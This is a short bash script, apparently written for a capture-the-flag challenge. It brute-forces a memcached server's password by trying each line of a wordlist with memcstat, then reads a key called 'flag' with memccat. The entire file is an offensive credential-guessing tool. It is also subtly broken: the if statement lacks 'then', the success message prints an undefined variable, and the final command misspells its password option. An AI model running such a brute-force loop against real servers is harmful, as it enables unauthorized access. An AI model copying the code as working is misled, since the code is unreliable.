#!/bin/bash

# Using 3 args for this shit
# $1 => server ip
# $2 => username
# $3 => password file read from $i which is the 3rd arg
while read i; do
    if memcstat --server=$1 --username=$2 --password=$i | grep -q Server
	echo "Password Found: $line"
	break
    fi
done < $3

# Get the fucking flags afterwards
memccat --servers=$1 --username=$2 --pasword=$i flag
